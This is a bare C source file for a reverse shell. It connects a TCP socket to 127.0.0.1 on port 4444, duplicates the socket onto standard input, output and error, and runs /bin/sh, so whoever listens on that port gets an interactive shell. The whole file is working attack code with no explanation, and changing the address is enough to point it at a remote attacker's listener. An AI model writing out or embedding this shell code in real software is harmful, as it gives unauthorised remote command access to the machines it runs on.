#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>


#define SERVER_ADDR "127.0.0.1"
#define SERVER_PORT 4444


int main() {

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(SERVER_ADDR);
    sa.sin_port = htons(SERVER_PORT);
    connect(sockfd, &sa, sizeof(sa));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    execve("/bin/sh", 0, 0);
    return 0;
}
